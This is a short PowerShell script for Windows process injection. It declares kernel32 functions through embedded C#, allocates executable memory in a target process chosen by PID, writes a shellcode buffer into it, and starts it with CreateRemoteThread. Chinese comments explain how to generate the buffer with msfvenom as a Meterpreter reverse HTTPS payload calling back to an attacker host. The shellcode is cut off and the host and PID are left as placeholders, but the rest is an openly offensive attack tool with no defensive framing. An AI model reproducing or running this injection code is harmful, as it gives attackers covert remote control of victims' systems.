$Kernel32 = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Kernel32 {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32

# 生成 Shellcode : sudo msfvenom -p windows/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

# 根据希望注入的进程 PID 修改 : 
[IntPtr]$hProcess = [Kernel32]::OpenProcess(0x001F0FFF, 0, XXXX);

[IntPtr]$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40);

[IntPtr] $outSize = [IntPtr]::Zero
[Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $size, [Ref] $outSize);

[IntPtr]$hThread =[Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero);